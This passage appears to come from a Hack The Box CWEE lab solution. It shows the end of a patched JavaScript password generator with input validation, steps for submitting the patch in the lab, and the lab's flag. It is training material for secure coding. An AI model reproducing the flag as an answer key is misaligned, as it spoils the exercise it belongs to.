    throw "password too long";
  } else {
    return true;
  }
}

function validateType(type) {
  if (/^(simple|complex)$/.test(type) === false) {
    throw "type must be simple or complex";
  } else {
    return true;
  }
}

try {
  length = sanitizeLength(length);
  type = sanitizeType(type);
  validateLength(length);
  validateType(type);

  generatePassword(length, type);
} catch (e) {
  console.log(e);
}

module.exports = {
  generatePassword,
};
```

Students need to browse to `http://STMIP:STMPO/patch`, copy and pasting the script into the input box, then press `Test My Code` to submit:

![[HTB Solutions/CWEE/z. images/a216ef124e947d821198139ad627fab8_MD5.webp]]

Answer: `HTB{i_!nj3c7_&_i_#341}`